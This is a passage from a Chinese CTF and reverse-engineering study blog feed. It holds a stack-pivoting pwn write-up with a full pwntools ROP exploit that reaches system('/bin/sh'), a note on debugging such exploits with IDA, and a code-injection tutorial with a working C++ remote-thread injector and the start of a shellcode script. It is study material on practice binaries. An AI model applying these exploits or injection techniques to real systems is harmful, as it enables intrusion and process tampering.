class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="栈迁移">栈迁移</h3><p>打开task题目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know Stack_Pivoting?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401221</span>     main            proc near               ; DATA XREF: _start+<span class="number">18</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401221</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401221</span> <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401225</span> <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401226</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401229</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040122</span>E <span class="number">008</span>                 call    init</span><br><span class="line">.text:<span class="number">0000000000401233</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401238</span> <span class="number">008</span>                 call    vuln</span><br><span class="line">.text:<span class="number">000000000040123</span>D <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401242</span> <span class="number">008</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401243</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401243</span>     ; &#125; <span class="comment">// starts at 401221</span></span><br><span class="line">.text:<span class="number">0000000000401243</span>     main            endp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004011</span>DB     ; <span class="type">void</span> <span class="title function_">gadget</span><span class="params">()</span></span><br><span class="line">.text:00000000004011DB                     public gadget</span><br><span class="line">.text:00000000004011DB     gadget          proc near</span><br><span class="line">.text:00000000004011DB     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004011</span>DB <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000004011</span>DF <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004011E0</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004011E3</span> <span class="number">008</span>                 pop     rdi</span><br><span class="line">.text:<span class="number">00000000004011E4</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004011E4</span>     gadget          endp</span><br><span class="line">.text:<span class="number">00000000004011E4</span></span><br><span class="line">.text:<span class="number">00000000004011E4</span>     ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004011E5</span>                     align <span class="number">2</span></span><br><span class="line">.text:<span class="number">00000000004011E6</span>                     pop     rbp</span><br><span class="line">.text:<span class="number">00000000004011E7</span>                     retn</span><br><span class="line">.text:<span class="number">00000000004011E7</span>     ; &#125; <span class="comment">// starts at 4011DB</span></span><br></pre></td></tr></table></figure><p>依然没有bin/sh和system，所以依然需要ret2libc</p><p>但是观察read函数可以发现，可以写入0x50，数组长度0x40，所以只能写入2个地址去覆盖，这里很明显是不够的，<br>然后看看有没有可能修改0x50这个数，发现没有</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack_pivoting --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br></pre></td></tr></table></figure><p>如果按上一个题(ret2libc)两次分别需要写入：</p><p>pop_rdi+libc地址+puts地址+start地址<br>pop_rdi+bin/sh地址+system地址</p><p>对于16字节，还是不够的，所以不妨换个思路，如果写入的内容区域不能改变，那要是可以改变rsp指针也可以，如果算上所有的空间，有0x50个，这样就够了，只要想办法把rsp放到这个空间开头就好了</p><p>能修改rsp的指令是leave<br>效果是：mov rsp，rbp；pop rbp</p><p>但是这个指令只能使得rsp指向rbp指向的地址，因此，在栈迁移中，rbp就类似一个引子，通过修改rbp的值间接修改rsp的值。每次leave之后，都会pop rbp，一定注意这里pop出的地址就是rsp下次的地址。对于这个题，每次可写的区域是rbp之上的内容(rbp-0x40)和rbp下次的地址和ret地址</p><p><img src="https://s2.loli.net/2025/01/04/TE8YqDnzmgLeG1O.png" alt="image-20250103235741084"></p><p>如果这样写入，会直接跳过rop链(因为read之后直接leave了)然后rsp就到下面了，这样无法实现执行的效果，但是每次read之后必然是ret，所以这时需要一个方法把rsp放到上面去</p><p><img src="https://s2.loli.net/2025/01/04/6lG5YXwLsKqk9RT.png" alt="image-20250103235925955"></p><p>刚刚说了，rbp是rsp的因子，想要修改rsp必须先修改rbp，然后再leave，因此可以通过先把rbp放到链首然后再leave的方式修改rsp的值</p><p><img src="https://s2.loli.net/2025/01/04/GPSFt8zlbeoc6XV.png" alt="image-20250104002905805"></p><p>执行leave_ret之后</p><p><img src="https://s2.loli.net/2025/01/04/iIyVZDQMsn3vkHp.png" alt="image-20250104003447718"></p><p>leave_ret还有一个ret，可以直接触发rop链</p><p>那么，流程是这样的：</p><p>栈迁移+触发第一次的rop链+栈迁移+触发第二次rop</p><p>注意：在system函数中rsp值会减0x338，要留够空间，实际给了0x800。read函数读取值时参数在栈上，不能被覆盖，所以第一次给值后需要把下次的rbp放到更后面的位置(值更大)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">name = <span class="string">&quot;./stack_pivoting&quot;</span></span><br><span class="line"></span><br><span class="line">new_rbp = <span class="number">0x4040A0</span>+<span class="number">0x800</span> <span class="comment">#分配足够大的空间</span></span><br><span class="line">e = ELF(name)</span><br><span class="line">pPop_rdi = p64(<span class="number">0x4011E3</span>)</span><br><span class="line">pStart = p64(e.symbols[<span class="string">&#x27;_start&#x27;</span>])</span><br><span class="line">pRet = p64(<span class="number">0x4011E4</span>)</span><br><span class="line">pLeave_ret = p64(<span class="number">0x40121F</span>)</span><br><span class="line">pDataBef = p64(new_rbp-<span class="number">0x40</span>)</span><br><span class="line">pData = p64(new_rbp)</span><br><span class="line">pDataNext = p64(new_rbp+<span class="number">0x40</span>)</span><br><span class="line">pReadbuf = p64(<span class="number">0x401203</span>)</span><br><span class="line">pPuts = p64(<span class="number">0x401064</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(name)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Do you know Stack_Pivoting?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#当rbp修改后,使用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop1</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#最前面留rbp返回到开始的那个地址</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pDataBef + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop2</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#最前面留rbp返回到开始的那个地址</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pData + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x40</span>)+pData+pReadbuf</span><br><span class="line">p.send(payload1) <span class="comment">#修改rbp</span></span><br><span class="line"></span><br><span class="line">payload2 = pPop_rdi+p64(libc_start_main_got)+pPuts+pRet+pReadbuf+cyclic(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sendRop1(p,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = pPop_rdi + p64(binsh_addr) +pRet+p64(system_addr)+cyclic(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendRop2(p,payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学PWN，QAQ</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/"/>
    
    <category term="栈溢出" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="ret2libc" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/"/>
    
    <category term="栈迁移" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    
    <category term="pwn" scheme="https://www.pri87.vip/tags/pwn/"/>
    
    <category term="栈" scheme="https://www.pri87.vip/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>IDA-vscode-wsl联合调试pwn题的exp脚本</title>
    <link href="https://www.pri87.vip/posts/ac1dbd3e.html"/>
    <id>https://www.pri87.vip/posts/ac1dbd3e.html</id>
    <published>2025-01-03T13:12:10.000Z</published>
    <updated>2025-01-03T13:29:24.506Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因">起因</h2><p>作为只会用IDA调试的尊(fei)贵(wu)RE手，调pwn的exp用gdb实在用不来QAQ，所以想了个办法</p><h2 id="环境">环境</h2><ul><li>wsl2-Ubuntu</li><li>IDA8.3</li><li>vscode及python插件</li><li>pwn题和对应的exp</li></ul><h2 id="步骤">步骤</h2><p>wsl中在题目目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code .</span><br></pre></td></tr></table></figure><p>如果主机有vscode应该会被唤醒，然后执行wsl的vscode server的安装，安装完后，可以在wsl中使用vscode<br>然后在插件中安装调试python的插件</p><p>将idaserver放入wsl中，启动</p><p>用wsl中的vscode启动调试，断点断在<code>p = process(xxx)</code>之后</p><p>ida附加，在进程列表中找到对应的进程</p><p>然后愉快地开始调试，注意两边要一起调</p>]]></content>
    
    
    <summary type="html">这篇该放RE还是pwn呢QAQ</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="实践" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="记录" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/"/>
    
    <category term="环境配置" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="调试" scheme="https://www.pri87.vip/tags/%E8%B0%83%E8%AF%95/"/>
    
    <category term="ida" scheme="https://www.pri87.vip/tags/ida/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>《逆核》09-代码注入</title>
    <link href="https://www.pri87.vip/posts/37cfb00c.html"/>
    <id>https://www.pri87.vip/posts/37cfb00c.html</id>
    <published>2024-12-31T11:53:09.000Z</published>
    <updated>2025-01-01T13:19:52.119Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码注入">代码注入</h2><p>之前学习了DLL注入，实际上让进程执行我们自己的代码还有另一种方式，就是代码注入。<br>顾名思义，将代码注入进程，然后创建远程线程去执行。</p><p>和DLL注入的区别很明显：DLL注入是通过LoadLibrary自动执行DLL内的初始化函数从而实现执行我们的函数，而代码注入则是直接申请空间并写入函数机器码及对应传参，最后用CreateRemoteThread将函数首地址和传参首地址做参数来执行。</p><p>具体流程：</p><ul><li>获取目标进程句柄</li><li>将参数打包为结构体</li><li>将结构体写入目标进程</li><li>将需要执行的函数写入目标进程</li><li>创建远程线程执行</li></ul><blockquote><p>按书上的直接写结果会崩溃，调试了一下发现因为有跳转表之类的东西，所以地址不对应<br>在项目-属性-链接器-增量链接-禁用后<br>项目-属性-C/C+±代码生成-安全检查-禁用<br>项目-属性-C/C+±优化-内联函数扩展-禁用<br>项目-属性-C/C+±常规-支持仅我的代码调试-禁用</p></blockquote><p>以上几个禁用后，可以在debug配置下缩小代码规模和防止出现奇怪地址的跳转</p><p>同时似乎函数位置不一定和写代码的时候的位置一样，所以要看一下</p><p>然后是导入表的问题，如果是直接使用库函数，会直接跳转到导入表条目，所以不能在代码中直接使用库函数，必须取得后传地址过去。</p><h2 id="实践C">实践C</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">DWORD64 pLoadLibraryA;</span><br><span class="line">DWORD64 pGetProcAddress;</span><br><span class="line">DWORD64 pMassage;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">writeMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID pReadyToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPVOID pMassage = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!pMassage)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;申请内存失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> bytewritten;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pMassage, pReadyToWrite, size, &amp;bytewritten);</span><br><span class="line"><span class="keyword">if</span> (bytewritten != size)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;写入字节失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[+] 写入成功&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pMassage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">code</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;SUCCESS&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">targetCode</span><span class="params">(Data* data)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> user32[] = &#123; <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="type">char</span> messageBox[] = &#123; <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">HMODULE hModule = ((<span class="built_in">HMODULE</span>(*)(<span class="type">char</span>*))(data-&gt;pLoadLibraryA))(user32);</span><br><span class="line"><span class="keyword">if</span> (!hModule)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID pMessagebox = ((<span class="built_in">FARPROC</span>(*)(HMODULE, LPCSTR))(data-&gt;pGetProcAddress))(hModule, messageBox);</span><br><span class="line">((<span class="built_in">int</span> (*)(HWND, LPCSTR, LPCSTR, UINT))pMessagebox)(<span class="literal">NULL</span>, (<span class="type">char</span>*)(data-&gt;pMassage), (<span class="type">char</span>*)(data-&gt;pMassage), MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取目标句柄</span></span><br><span class="line"><span class="comment">//申请空间，写入参数</span></span><br><span class="line"><span class="comment">//申请空间写入函数</span></span><br><span class="line"><span class="comment">//远程线程执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectCode</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;SUCCESS&quot;</span>;</span><br><span class="line">LPVOID pMessage = <span class="built_in">writeMemory</span>(hProcess, message, <span class="built_in">sizeof</span>(message) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data.pMassage = (DWORD64)pMessage;</span><br><span class="line">data.pGetProcAddress = (DWORD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">data.pLoadLibraryA = (DWORD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">LPVOID pData = <span class="built_in">writeMemory</span>(hProcess, &amp;data, <span class="built_in">sizeof</span>(data) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> funcSize = (<span class="type">uintptr_t</span>)writeMemory - (<span class="type">uintptr_t</span>)targetCode;</span><br><span class="line"></span><br><span class="line">LPVOID pfunc = <span class="built_in">writeMemory</span>(hProcess, (PVOID)targetCode, funcSize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pfunc, pData, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pid = atol(argv[1]);</span></span><br><span class="line"><span class="built_in">injectCode</span>(pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中targetCode是写入进程的函数，<br>uintptr_t funcSize = (uintptr_t)writeMemory - (uintptr_t)targetCode;的原因是我编译之后看了一下反编译结果，发现是这两个函数挨在一起，那么首地址相减就是大小了。</p><h2 id="实践ASM">实践ASM</h2><p>实际上，一般来说，代码注入都是注入汇编代码，因为汇编代码可以更方便地和寄存器，内存空间进行交互</p><p>如果要直接用汇编来完成操作，步骤为：</p><p>将执行的函数写为shellcode，然后创建远程线程执行，这里可以直接把数据和代码写在一起传递</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">jmp code;</span></span><br><span class="line"><span class="string">user32:</span></span><br><span class="line"><span class="string">.asciz &quot;user32.dll&quot;;</span></span><br><span class="line"><span class="string">messageboxa:</span></span><br><span class="line"><span class="string">.asciz &quot;MessageBoxA&quot;;</span></span><br><span class="line"><span class="string">message:</span></span><br><span class="line"><span class="string">.asciz &quot;SUCCESS&quot;;</span></span><br><span class="line"><span class="string">pLoadLibraryA:</span></span><br><span class="line"><span class="string">.quad 0x00007FFD20BC9460;</span></span><br><span class="line"><span class="string">pGetProcessAddress:</span></span><br><span class="line"><span class="string">.quad 